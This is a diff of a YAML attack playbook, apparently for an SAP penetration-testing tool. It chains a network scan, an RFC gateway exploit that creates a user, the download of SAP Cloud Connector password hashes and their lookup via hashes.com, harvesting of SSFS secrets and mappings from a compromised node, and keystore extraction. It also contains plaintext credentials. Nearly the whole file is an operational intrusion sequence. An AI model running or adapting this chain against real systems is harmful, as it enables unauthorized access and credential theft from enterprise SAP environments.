@@ -8,39 +8,53 @@
 # Replace host/sid/credentials before use.
 
 steps:
-  # 1. Store SCC credentials so subsequent steps auto-fill
-  - action: scc_set_credentials
-    target: "192.168.2.167"
-    username: Administrator
-    password: "Manage1"
 
-  # 2. Pull cloud→on-prem mappings and plot them on the map
-  - action: scc_pull_mappings
-    target: "192.168.2.167"
-    username: Administrator
-    password: "Manage1"
+  # 1. Discover SAP systems on the network
+  - action: scan
+    targets: "192.168.2.209"
+    mode: fast
+    timeout: 600
 
-  # 3. Smoke-test every mapping to confirm backend reachability
-  - action: scc_probe_mappings
-    target: "192.168.2.167"
+  # 2. Other view
+  - action: layout
+    mode: hierarchy     # or: star | circle | stack | hierarchy | reset
 
-  # 4. Extract full backup + keystores + decrypt SSFS (crown jewels)
-  #    Requires --confirm on the CLI
-  - action: scc_extract_keystore
-    target: "192.168.2.167"
-    username: Administrator
-    password: "Manage1"
-    backup_password: "Manage1"
+  # 3. Check GW vuln
+  - action: check_gw
+    target: S4H
+
+  # 4. Create user via RFC GW
+  - action: create_user
+    target: S4H
+    method: gw_exploit
+    client: "001"
 
   # 5. Download SCC password hashes (from backup zip or OS-exec)
   - action: scc_download_hashes
-    target: "192.168.2.167"
+    target: "192.168.2.209"
 
-  # 6. From co-located pwned SAP node: read on-host SSFS directly
+  # 6. Lookup SCC password hashes (via hashes.com)
+  - action: scc_lookup_hashes
+    target: "192.168.2.209"
+
+  # 7. From co-located pwned SAP node: read on-host SSFS directly
   #    (backup zip SSFS is double-encrypted — on-host files are not)
   - action: harvest_scc_ssfs
     target: S4H
 
-  # 7. From co-located pwned SAP node: read SCC mappings from disk
+  # 8. From co-located pwned SAP node: read SCC mappings from disk
   - action: harvest_scc_mappings
     target: S4H
+
+  
+  # 9. Smoke-test every mapping to confirm backend reachability
+  - action: scc_probe_mappings
+    target: "192.168.2.209"
+
+  # 10. Extract full backup + keystores + decrypt SSFS (crown jewels)
+  #    Requires --confirm on the CLI. Password already gathered via step 5+6
+  - action: scc_extract_keystore
+    target: "192.168.2.209"
+    username: Administrator
+    password: "Welcome"
+    backup_password: "Welcome"
